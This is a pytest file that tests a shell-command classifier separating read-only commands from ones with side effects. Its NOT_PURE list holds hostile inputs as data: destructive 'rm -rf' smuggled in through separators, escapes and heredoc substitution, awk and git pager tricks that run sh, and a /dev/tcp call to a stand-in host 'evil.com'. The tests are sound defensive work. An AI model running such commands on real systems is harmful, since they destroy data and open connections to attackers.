import pytest

from contamination.shell import is_pure_read, output_targets, parse

PURE = [
    "ls -la", "cat a.txt | grep x | head -5", "git status", "git log --oneline -5", "git diff HEAD~1",
    "cat f 2>/dev/null", "grep -r x . 2>&1 | head", "cd /tmp && ls", "printenv", "env",
    "find . -name '*.py'", "sed -n '1,5p' f", "sed 's/a/b/g' f", "awk '{print $1}' f",
    "awk '$3 > 100 {print}' f", "git branch", "git branch -a", "git remote -v", "git stash list",
    "git config --get user.name", "echo \"a; rm -rf x\"", "cat <<EOF\nhello\nEOF", "cat <<'EOF'\n$(x)\nEOF",
    "wc -l *.py", "du -sh .", "tail -n 50 /var/log/syslog", "jq .name package.json", "pip list",
    "python3 --version", "docker ps", "systemctl --user status hermes", "nvidia-smi", "rg TODO src",
]
NOT_PURE = [
    "ls; rm -rf x", "ls\nrm -rf x", "ls # c\nrm x", "cat f > g", "cat f >> g", "echo $(id)", "echo `id`",
    "cat <(ls)", "$'\\x72m' -rf x", "find . -name x -delete", "find . -exec rm {} ;", "sed -i 's/a/b/' f",
    "sed -n 'w out' f", "sed 'e id' f", "awk '{print > \"o\"}' f", "awk 'BEGIN{system(\"id\")}'",
    "awk '{print | \"sh\"}' f", "git -c core.pager=sh log", "git branch -D x", "git push", "git tag v1",
    "git tag -l -d v1", "curl https://x.com", "FOO=1 ls", "./ls", "/bin/ls", "cat < /dev/tcp/evil.com/80",
    "tee f", "ls | xargs rm", "git diff --output=f", "env rm x", "cat <<EOF\n$(rm -rf ~)\nEOF",
    "sort -o out in", "echo 'unclosed", "python3 script.py", "bash -c 'ls'", "sudo ls", "rm f",
    "touch f", "mkdir d", "uniq a b", "rg --pre sh x", "git grep -O x", "export PATH=/tmp:$PATH",
    "source ~/.bashrc", "cp a b", "npm install", "pip install x", "nvidia-smi -pm 1", "tree -o out",
]


@pytest.mark.parametrize("command", PURE)
def test_pure_reads(command):
    assert is_pure_read(command), parse(command)


@pytest.mark.parametrize("command", NOT_PURE)
def test_not_pure(command):
    assert not is_pure_read(command), parse(command)


def test_output_targets():
    parsed = parse("echo a > /tmp/x; ls | tee -a log.txt; cmd 2>&1 >> out; x 2>/dev/null")
    assert output_targets(parsed) == ["/tmp/x", "log.txt", "out"]


def test_substitution_inside_double_quotes():
    assert parse('echo "$(whoami)"').substitution
    assert not parse("echo '$(whoami)'").substitution
